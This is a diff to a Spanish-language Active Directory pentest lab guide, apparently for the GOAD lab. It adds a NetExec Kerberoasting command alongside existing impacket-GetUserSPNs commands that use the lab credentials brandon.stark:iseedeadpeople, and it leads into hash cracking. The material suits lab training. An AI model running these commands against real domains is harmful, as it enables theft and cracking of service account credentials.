@@ -61,6 +61,9 @@ impacket-GetUserSPNs -dc-ip 192.168.56.11 -outputfile asrephash -usersfile users
 
 ### O con el usuario brandon.stark
 impacket-GetUserSPNs -dc-ip 192.168.56.11 -outputfile kerberoasting.hashes -usersfile users.txt 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople'
+
+### Alternativa con NetExec
+nxc ldap 192.168.56.11 -u brandon.stark -p iseedeadpeople --kerberoasting kerberoasting.hash
 ```
 
 Para crackear el hash:
